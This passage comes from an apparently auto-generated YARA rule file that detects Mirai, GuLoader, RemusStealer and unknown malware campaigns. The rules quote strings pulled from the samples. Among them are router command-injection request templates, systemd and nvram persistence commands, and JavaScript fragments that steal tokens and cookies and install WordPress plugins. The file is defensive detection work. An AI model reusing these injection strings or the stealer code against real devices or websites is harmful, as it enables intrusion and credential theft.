        $s10 = "mount -o remount,rw /system >/dev/null 2>&1" ascii
        $s11 = "systemctl daemon-reload >/dev/null 2>&1" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_1fa020be_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-1fa020be"
        date = "2026-10-20"
        campaign = "tlsh-1fa020be"
        family = "mirai"
        hash = "1f033b961e57f63b7dc2735bb21abebd94ebca07c2b2b08068f0faf8af18623f"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-1fa020be.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "DMCCRe7HaAgEeoZzN31Fu9LjO/wl9ngRG3jRpXKRSzds+N4GSOL/NymOIlRTL+R1QakC03hcj1Zqoi2FyPBmiVCnxlbgqpYkum1N" ascii
        $s1 = "v+6LOO5aoJrn0qJRcQ5rbpb4IKVjRrOrHMNShtRRLdWAZ3UiMvpDyOoO7a6PIpGk4hRP89NqZQldou3t6KTUhUKqFNc/JXYzyZj2" ascii
        $s2 = "wSbUApq6npt6MrE/917Hc3efVV93zbHgLh1CFWYass8cJ8OZ17c4KTtmDZtKY+q/9ZOya6Q0PPTo6BchnNzEQQIDAQAB" ascii
        $s3 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAmmFi2EB5BpqTSnj66P5Sd5CX+2p+eelmwR0PUuf7paUg9o7KBvAFPM0p" ascii
        $s4 = "WireGuard v1 zx2c4 Jason@zx2c4.comNoise_IKpsk2_25519_ChaChaPoly_BLAKE2s" ascii
        $s5 = "OAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><SOAP-ENV:Body><m:AddPortMapping x" ascii
        $s6 = "<?xml version=\"1.0\"?><SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" S" ascii
        $s7 = "GET /setup.cgi?todo=ping_test&next_file=diagping.htm&c4_IPAddr=;%s HTTP/1.1" ascii
        $s8 = "GET /cgi-bin/webproc?getpage=html/index.html&var:menu=setup&var:page=wizard&var:subpage=wiz_wan_,;%s" ascii
        $s9 = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><language>$(%s)</language>" ascii
        $s10 = "GET /adv,/cgi-bin/weblogin.cgi?username=admin';%s;' HTTP/1.1" ascii
        $s11 = "GET /cgi-bin/masterCGI?ping=nomip&user=;%s; HTTP/1.1" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_022db377_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-022db377"
        date = "2026-10-21"
        campaign = "tlsh-022db377"
        family = "mirai"
        hash = "0c0dd052789ca7513dfa96a62727b31735f219c14da0de7fea1a7216bab7bc57"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-022db377.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "cat > \"$d/network-dispatch.service\" <<EOF" ascii
        $s1 = "ln -sf \"$d/network-dispatch.service\" \"$d/multi-user.target.wants/network-dispatch.service\"" ascii
        $s2 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ascii
        $s3 = "/magisk/.core/service.d/99-network-dispatch" ascii
        $s4 = "/root/.config/systemd/user/network-dispatch.service" ascii
        $s5 = "/etc/udev/rules.d/99-network-dispatch.rules" ascii
        $s6 = "Cache-Control: no-cache, no-store, must-revalidate" ascii
        $s7 = "option post_install_hook /etc/init.d/network-dispatch" ascii
        $s8 = "Noise_IKpsk2_25519_ChaChaPoly_BLAKE2s" ascii
        $s9 = "rc_startup=/etc/init.d/network-dispatch start" ascii
        $s10 = "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6" ascii
        $s11 = "/etc/xdg/autostart/network-dispatch.desktop" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1111288 and 11 of them
}

rule Sightlines_rich_header_hash_765116da_guloader
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign rich_header_hash-765116da"
        date = "2026-10-21"
        campaign = "rich_header_hash-765116da"
        family = "guloader"
        hash = "27cb385ffdd96c18ac7bcfd42a121e5cc4b526da818a7e3694b72655e4d5142a"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/rich_header_hash-765116da.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/><supportedOS Id=\"{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}\"/><supportedOS Id=\"{35138b9a-5d96-4fbd-8e2" ascii
        $s1 = "d=\"{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}\"/><supportedOS Id=\"{1f676c76-80e1-4239-95bb-83d0f6d0da78}\"" ascii
        $s2 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:as" ascii
        $s3 = "mbly></dependency><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges" ascii
        $s4 = "m.v1\" manifestVersion=\"1.0\"><assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"*\" name=\"Null" ascii
        $s5 = "stInfo><compatibility xmlns=\"urn:schemas-microsoft-com:compatibility.v1\"><application><supportedOS I" ascii
        $s6 = "><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=" ascii
        $s7 = "d-a2440225f93a}\"/></application></compatibility></assembly>" ascii
        $s8 = "><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/></requestedPrivileges></security></tru" ascii
        $s9 = "\\Microsoft\\Internet Explorer\\Quick Launch" wide
        $s10 = "Installer integrity check has failed. Common causes include" wide
        $s11 = "Error writing temporary file. Make sure your temp folder is valid." wide
    condition:
        uint16(0) == 0x5A4D and filesize < 2555904 and 12 of them
}

rule Sightlines_tlsh_a4217816_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-a4217816"
        date = "2026-10-20"
        campaign = "tlsh-a4217816"
        family = ""
        hash = "152585331df78329614b0457d9e339c84bac079f20bd5db7bceb9ef91e1afb2a"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-a4217816.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "nU01Z!Adu]-s;Eb}Za" ascii
        $s1 = "U,o[iUimaucvXYVPf" ascii
        $s2 = "fabric.mod.jsonPK" ascii
        $s3 = "f`u5\\K6q155T@XV" ascii
        $s4 = "8l9]o#5tYHnaK\"" ascii
        $s5 = "OW:xI>Y\"^Ow4xIa" ascii
        $s6 = "B$'$U<BMwaGICL" ascii
        $s7 = "&c<Z9dIieYJH." ascii
        $s8 = "C1Yz_}d9w=?m8" ascii
        $s9 = "N2dM>\\iB/3rFA" ascii
        $s10 = "H?LH?PH?TH?XH?\\H?fH" ascii
        $s11 = "B*ItAa=?I:%nt" ascii
    condition:
        filesize < 5567608 and 12 of them
}

rule Sightlines_tlsh_8248c3b4_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-8248c3b4"
        date = "2026-10-20"
        campaign = "tlsh-8248c3b4"
        family = "mirai"
        hash = "23116e8379bc88edd4de1e6bf83a09f92bf2fd2d645de18a5ef04c6c9a0441bf"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-8248c3b4.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "DMCCRe7HaAgEeoZzN31Fu9LjO/wl9ngRG3jRpXKRSzds+N4GSOL/NymOIlRTL+R1QakC03hcj1Zqoi2FyPBmiVCnxlbgqpYkum1N" ascii
        $s1 = "v+6LOO5aoJrn0qJRcQ5rbpb4IKVjRrOrHMNShtRRLdWAZ3UiMvpDyOoO7a6PIpGk4hRP89NqZQldou3t6KTUhUKqFNc/JXYzyZj2" ascii
        $s2 = "wSbUApq6npt6MrE/917Hc3efVV93zbHgLh1CFWYass8cJ8OZ17c4KTtmDZtKY+q/9ZOya6Q0PPTo6BchnNzEQQIDAQAB" ascii
        $s3 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAmmFi2EB5BpqTSnj66P5Sd5CX+2p+eelmwR0PUuf7paUg9o7KBvAFPM0p" ascii
        $s4 = "OAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><SOAP-ENV:Body><m:AddPortMapping x" ascii
        $s5 = "<?xml version=\"1.0\"?><SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" S" ascii
        $s6 = "GET /setup.cgi?todo=ping_test&next_file=diagping.htm&c4_IPAddr=;%s HTTP/1.1" ascii
        $s7 = "GET /cgi-bin/webproc?getpage=html/index.html&var:menu=setup&var:page=wizard&var:subpage=wiz_wan_,;%s" ascii
        $s8 = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><language>$(%s)</language>" ascii
        $s9 = "GET /adv,/cgi-bin/weblogin.cgi?username=admin';%s;' HTTP/1.1" ascii
        $s10 = "GET /cgi-bin/masterCGI?ping=nomip&user=;%s; HTTP/1.1" ascii
        $s11 = "POST /wanipcn.xml?service=WANIPConn1 HTTP/1.1" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_f00349fb_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-f00349fb"
        date = "2026-10-21"
        campaign = "tlsh-f00349fb"
        family = "mirai"
        hash = "2943744be5c853e6457faa4f02248762dfc1ff97e1a661cccf6abafa46f2338f"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-f00349fb.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "DMCCRe7HaAgEeoZzN31Fu9LjO/wl9ngRG3jRpXKRSzds+N4GSOL/NymOIlRTL+R1QakC03hcj1Zqoi2FyPBmiVCnxlbgqpYkum1N" ascii
        $s1 = "v+6LOO5aoJrn0qJRcQ5rbpb4IKVjRrOrHMNShtRRLdWAZ3UiMvpDyOoO7a6PIpGk4hRP89NqZQldou3t6KTUhUKqFNc/JXYzyZj2" ascii
        $s2 = "wSbUApq6npt6MrE/917Hc3efVV93zbHgLh1CFWYass8cJ8OZ17c4KTtmDZtKY+q/9ZOya6Q0PPTo6BchnNzEQQIDAQAB" ascii
        $s3 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAmmFi2EB5BpqTSnj66P5Sd5CX+2p+eelmwR0PUuf7paUg9o7KBvAFPM0p" ascii
        $s4 = "WireGuard v1 zx2c4 Jason@zx2c4.comNoise_IKpsk2_25519_ChaChaPoly_BLAKE2s" ascii
        $s5 = "OAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><SOAP-ENV:Body><m:AddPortMapping x" ascii
        $s6 = "<?xml version=\"1.0\"?><SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" S" ascii
        $s7 = "GET /setup.cgi?todo=ping_test&next_file=diagping.htm&c4_IPAddr=;%s HTTP/1.1" ascii
        $s8 = "GET /cgi-bin/webproc?getpage=html/index.html&var:menu=setup&var:page=wizard&var:subpage=wiz_wan_,;%s" ascii
        $s9 = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><language>$(%s)</language>" ascii
        $s10 = "GET /adv,/cgi-bin/weblogin.cgi?username=admin';%s;' HTTP/1.1" ascii
        $s11 = "GET /cgi-bin/masterCGI?ping=nomip&user=;%s; HTTP/1.1" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_95457ab8_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-95457ab8"
        date = "2026-10-20"
        campaign = "tlsh-95457ab8"
        family = "mirai"
        hash = "2048f05290563172de52dd6b0123339d6de47392536f9b8643e88463780b9b6c"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-95457ab8.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "DMCCRe7HaAgEeoZzN31Fu9LjO/wl9ngRG3jRpXKRSzds+N4GSOL/NymOIlRTL+R1QakC03hcj1Zqoi2FyPBmiVCnxlbgqpYkum1N" ascii
        $s1 = "v+6LOO5aoJrn0qJRcQ5rbpb4IKVjRrOrHMNShtRRLdWAZ3UiMvpDyOoO7a6PIpGk4hRP89NqZQldou3t6KTUhUKqFNc/JXYzyZj2" ascii
        $s2 = "wSbUApq6npt6MrE/917Hc3efVV93zbHgLh1CFWYass8cJ8OZ17c4KTtmDZtKY+q/9ZOya6Q0PPTo6BchnNzEQQIDAQAB" ascii
        $s3 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAmmFi2EB5BpqTSnj66P5Sd5CX+2p+eelmwR0PUuf7paUg9o7KBvAFPM0p" ascii
        $s4 = "ZSWireGuard v1 zx2c4 Jason@zx2c4.comNoise_IKpsk2_25519_ChaChaPoly_BLAKE2s" ascii
        $s5 = "OAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><SOAP-ENV:Body><m:AddPortMapping x" ascii
        $s6 = "<?xml version=\"1.0\"?><SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" S" ascii
        $s7 = "GET /setup.cgi?todo=ping_test&next_file=diagping.htm&c4_IPAddr=;%s HTTP/1.1" ascii
        $s8 = "GET /cgi-bin/webproc?getpage=html/index.html&var:menu=setup&var:page=wizard&var:subpage=wiz_wan_,;%s" ascii
        $s9 = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><language>$(%s)</language>" ascii
        $s10 = "GET /adv,/cgi-bin/weblogin.cgi?username=admin';%s;' HTTP/1.1" ascii
        $s11 = "GET /cgi-bin/masterCGI?ping=nomip&user=;%s; HTTP/1.1" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_05bc8fa3_remusstealer
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-05bc8fa3"
        date = "2026-10-21"
        campaign = "tlsh-05bc8fa3"
        family = "remusstealer"
        hash = "27637ce02ac144ce1e7d29919f722f85cb53ad89a8bf1f634ab7d73cac83a0f7"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-05bc8fa3.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware>" ascii
        $s1 = "The result is too small to be represented (UNDERFLOW)" ascii
        $s2 = "      <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>" ascii
        $s3 = "random_device::random_device(const std::string&): unsupported token" ascii
        $s4 = "random_device::random_device(const std::string&): device not available" ascii
        $s5 = "cannot create std::vector larger than max_size()" ascii
        $s6 = "basic_string::_M_construct null not valid" ascii
        $s7 = "basic_string::_S_construct null not valid" ascii
        $s8 = "std::basic_string<char, std::char_traits<char>, std::allocator<char> >" ascii
        $s9 = "std::basic_iostream<char, std::char_traits<char> >" ascii
        $s10 = "std::basic_ostream<char, std::char_traits<char> >" ascii
        $s11 = "std::basic_istream<char, std::char_traits<char> >" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_93506d5c_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-93506d5c"
        date = "2026-10-21"
        campaign = "tlsh-93506d5c"
        family = "mirai"
        hash = "4dfdbafe8982f92cea52cd4522277e88ff73b121bb7a2fc4e4e2f62937050970"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-93506d5c.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "            <Permit8 Type=\"Channel\" Value=\"0,1,2..16\">PlaybackAudioStream</Permit8>" ascii
        $s1 = "    <AnonymousLogin Level=\"40/40\" Dispatch=\"account\">DISABLE</AnonymousLogin>" ascii
        $s2 = "            <Permit4 Type=\"Channel\" Value=\"0,1,2..16\">PlaybackAudio</Permit4>" ascii
        $s3 = "            <Permit7 Type=\"Channel\" Value=\"0,1,2..16\">PlaybackVideoStream</Permit7>" ascii
        $s4 = "            <Permit3 Type=\"Channel\" Value=\"0,1,2..16\">PlaybackVideo</Permit3>" ascii
        $s5 = "            <Permit6 Type=\"Channel\" Value=\"0,1,2..16\">LiveAudioStream</Permit6>" ascii
        $s6 = "            <Permit14 Type=\"Switch\" Value=\"YES/NO\">LogClean</Permit14>" ascii
        $s7 = "            <Permit5 Type=\"Channel\" Value=\"0,1,2..16\">LiveVideoStream</Permit5>" ascii
        $s8 = "        <Level Level=\"40/40\" Dispatch=\"account\">SUPERVISOR</Level>" ascii
        $s9 = "            <Permit15 Type=\"Switch\" Value=\"YES/NO\">CleanHDD</Permit15>" ascii
        $s10 = "            <Permit2 Type=\"Channel\" Value=\"0,1,2..16\">LiveAudio</Permit2>" ascii
        $s11 = "            <Permit13 Type=\"Switch\" Value=\"YES/NO\">LogReview</Permit13>" ascii
    condition:
        filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_0d334755_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-0d334755"
        date = "2026-10-20"
        campaign = "tlsh-0d334755"
        family = ""
        hash = "1717578123d9b56b5fbaff3ecb2341ddbbf2b0cc6b0ad36f3b55b0bb3d562c73"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-0d334755.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "arer|csrf/i.test(k)){var v=String(st.getItem(k));if(v.length>8&&v.length<2000)o[s[0]+':'+k]=v}}}catc" ascii
        $s1 = "h(e){}});var c=document.cookie||'';if(c)o.c=c.slice(0,1500);if(!Object.keys(o).length)return;var x=n" ascii
        $s2 = "window[s];for(var i=0;i<st.length;i++){var k=st.key(i);if(/token|jwt|auth|_key|api|secret|session|be" ascii
        $s3 = "ew XMLHttpRequest();x.open('POST',rep,true);x.setRequestHeader('Content-Type','application/json');x." ascii
        $s4 = "}function __loot(rep){try{var o={};['localStorage','sessionStorage'].forEach(function(s){try{var st=" ascii
        $s5 = "    var p = await fetch('/wp-admin/plugin-install.php?tab=upload', { credentials: 'same-origin' });" ascii
        $s6 = "    if (uh.indexOf('Plugin installed successfully') === -1) { log('pivot_up_fail'); return; }" ascii
        $s7 = "    await fetch('/wp-admin/plugins.php?action=activate&plugin=' + am[1] + '&plugin_status=all&paged=" ascii
        $s8 = "    fd.append('_wp_http_referer', '/wp-admin/plugin-install.php?tab=upload');" ascii
        $s9 = "    var pl = await fetch('/wp-admin/plugins.php', { credentials: 'same-origin' });" ascii
        $s10 = "send(JSON.stringify(o))}catch(e){}}try{if(!sessionStorage.getItem('_pv1')){sessionStorage.setItem('_" ascii
        $s11 = "    var am = lh.match(/action=activate&amp;plugin=([^\"&]+)&amp;plugin_status=all&amp;paged=1&amp;s&a" ascii
    condition:
        filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_687b93b4_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-687b93b4"
        date = "2026-10-20"
        campaign = "tlsh-687b93b4"
        family = "mirai"
        hash = "250607dfe79758c99adb499c41708341b0e882fbd2bc80ddb9348e4974423d20"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-687b93b4.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Self Rep Fucking NeTiS and Thisity 0n Ur FuCkInG FoReHeAd We BiG L33T HaxErS" ascii
        $s1 = "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A" ascii
        $s2 = "e365`70;9ag:<$ef1=d?2>T" ascii
        $s3 = "509=:efg`" ascii
        $s4 = "5::=1fdef" ascii
        $s5 = ".-50efg`" ascii
        $s6 = "9t$$tBPPj" ascii
        $s7 = "$662*7!E" ascii
        $s8 = "7<5:3191" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 9 of them
}

rule Sightlines_tlsh_d6b469e8_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-d6b469e8"
        date = "2026-10-20"
        campaign = "tlsh-d6b469e8"
        family = "mirai"
        hash = "51653b8d81c0604c0adb9fa2af4bb8e0aeecc42f909ae03d1c5f7e9499b09b2f"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-d6b469e8.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Self Rep Fucking NeTiS and Thisity 0n Ur FuCkInG FoReHeAd We BiG L33T HaxErS" ascii
        $s1 = "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A" ascii
        $s2 = "e365`70;9ag:<$ef1=d?2>T" ascii
        $s3 = "509=:efg`" ascii
        $s4 = "5::=1fdef" ascii
        $s5 = ".-50efg`" ascii
        $s6 = "$662*7!E" ascii
        $s7 = "7<5:3191" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 8 of them
}

rule Sightlines_tlsh_b536c7da_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-b536c7da"
        date = "2026-10-20"
        campaign = "tlsh-b536c7da"
        family = "mirai"
        hash = "2b3f65dbfffe28aaec937324a104e04153f0fc379ee3cd0096724aac3e86d877"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-b536c7da.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Self Rep Fucking NeTiS and Thisity 0n Ur FuCkInG FoReHeAd We BiG L33T HaxErS" ascii
        $s1 = "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A" ascii
        $s2 = "e365`70;9ag:<$ef1=d?2>T" ascii
        $s3 = "509=:efg`" ascii
        $s4 = "5::=1fdef" ascii
        $s5 = ".-50efg`" ascii
        $s6 = "$662*7!E" ascii
        $s7 = "7<5:3191" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 8 of them
}

rule Sightlines_tlsh_29ebdb38_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-29ebdb38"
        date = "2026-10-20"
        campaign = "tlsh-29ebdb38"
        family = "mirai"
        hash = "5757bb1fa8d85ec537730756ba96c57d32482b8813db22fc1152a6274619559e"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-29ebdb38.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "851PGyBc7mdh4L72Viz5f9QggJuAzFTP9JXdvngQJFNh5nwRb8dpNjgWCDDC5T7JJ7HcKoAsRG1JWjkq5HqvcEBYHi1Yq8b" ascii
        $s1 = "WARNING: Unsupported flag value(s) of 0x%x in DT_FLAGS_1." ascii
        $s2 = "WARNING: ld.so: invalid GLIBC_TUNABLES value `%.*s' for option `%s': ignored." ascii
        $s3 = "(_res_hconf.flags & HCONF_FLAG_MULTI) != 0" ascii
        $s4 = "ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT" ascii
        $s5 = "((unsigned long) chunk2mem (brk) & MALLOC_ALIGN_MASK) == 0" ascii
        $s6 = "info[DT_RELAENT]->d_un.d_val == sizeof (ElfW(Rela))" ascii
        $s7 = "WARNING: ld.so: invalid GLIBC_TUNABLES `%s': ignored." ascii
        $s8 = "info[DT_RELRENT]->d_un.d_val == sizeof (ElfW(Relr))" ascii
        $s9 = "info[DT_RELENT]->d_un.d_val == sizeof (ElfW(Rel))" ascii
        $s10 = "version == NULL || !(flags & DL_LOOKUP_RETURN_NEWEST)" ascii
        $s11 = "(char *) chunk2mem (p) + 2 * CHUNK_HDR_SZ <= paligned_mem" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 2016932 and 12 of them
}

rule Sightlines_tlsh_efc34bb9_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-efc34bb9"
        date = "2026-10-20"
        campaign = "tlsh-efc34bb9"
        family = "mirai"
        hash = "230358697a04628990cfa14a90b7c3d241a0575fba7d8fb0891492973c6e4b7d"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-efc34bb9.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "851PGyBc7mdh4L72Viz5f9QggJuAzFTP9JXdvngQJFNh5nwRb8dpNjgWCDDC5T7JJ7HcKoAsRG1JWjkq5HqvcEBYHi1Yq8b" ascii
        $s1 = "WARNING: Unsupported flag value(s) of 0x%x in DT_FLAGS_1." ascii
        $s2 = "WARNING: ld.so: invalid GLIBC_TUNABLES value `%.*s' for option `%s': ignored." ascii
        $s3 = "(_res_hconf.flags & HCONF_FLAG_MULTI) != 0" ascii
        $s4 = "ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT" ascii
        $s5 = "((unsigned long) chunk2mem (brk) & MALLOC_ALIGN_MASK) == 0" ascii
        $s6 = "info[DT_RELAENT]->d_un.d_val == sizeof (ElfW(Rela))" ascii
        $s7 = "WARNING: ld.so: invalid GLIBC_TUNABLES `%s': ignored." ascii
        $s8 = "info[DT_RELRENT]->d_un.d_val == sizeof (ElfW(Relr))" ascii
        $s9 = "info[DT_RELENT]->d_un.d_val == sizeof (ElfW(Rel))" ascii
        $s10 = "version == NULL || !(flags & DL_LOOKUP_RETURN_NEWEST)" ascii
        $s11 = "(char *) chunk2mem (p) + 2 * CHUNK_HDR_SZ <= paligned_mem" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 2018116 and 12 of them
}

rule Sightlines_tlsh_fbf289e9_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-fbf289e9"
        date = "2026-10-21"
        campaign = "tlsh-fbf289e9"
        family = "mirai"
        hash = "037a8526c5b62cdae7552113e3e580dd47a90ca1f5c0fcca0aac8b7b07c1f835"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-fbf289e9.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s1 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8" ascii
        $s2 = "systemctl disable systemd-network-helper.service >/dev/null 2>&1" ascii
        $s3 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" ascii
        $s4 = "systemctl is-enabled systemd-network-helper.service >/dev/null 2>&1" ascii
        $s5 = "systemctl enable systemd-network-helper.service >/dev/null 2>&1" ascii
        $s6 = "nvram set rc_startup=\"%s\" >/dev/null 2>&1 && nvram commit >/dev/null 2>&1" ascii
        $s7 = "nvram set rc_startup=\"\" >/dev/null 2>&1 && nvram commit >/dev/null 2>&1" ascii
        $s8 = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ascii
        $s9 = "Content-Disposition: form-data; name=\"file\"; filename=\"%s.txt\"" ascii
        $s10 = "mount -o remount,rw /system >/dev/null 2>&1" ascii
        $s11 = "systemctl daemon-reload >/dev/null 2>&1" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_02c407a6_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-02c407a6"
        date = "2026-10-21"
        campaign = "tlsh-02c407a6"
        family = "mirai"
        hash = "1c8f9a57fe84029071cf4626ee34e3bd6e20e8c10dad4d0b45ae546ac5641485"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-02c407a6.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s1 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8" ascii
        $s2 = "systemctl disable systemd-network-helper.service >/dev/null 2>&1" ascii
        $s3 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" ascii
        $s4 = "systemctl is-enabled systemd-network-helper.service >/dev/null 2>&1" ascii
        $s5 = "systemctl enable systemd-network-helper.service >/dev/null 2>&1" ascii
        $s6 = "nvram set rc_startup=\"%s\" >/dev/null 2>&1 && nvram commit >/dev/null 2>&1" ascii
        $s7 = "nvram set rc_startup=\"\" >/dev/null 2>&1 && nvram commit >/dev/null 2>&1" ascii
        $s8 = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ascii
        $s9 = "Content-Disposition: form-data; name=\"file\"; filename=\"%s.txt\"" ascii
        $s10 = "mount -o remount,rw /system >/dev/null 2>&1" ascii
        $s11 = "systemctl daemon-reload >/dev/null 2>&1" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_11c8e538_mirai
{
    meta:
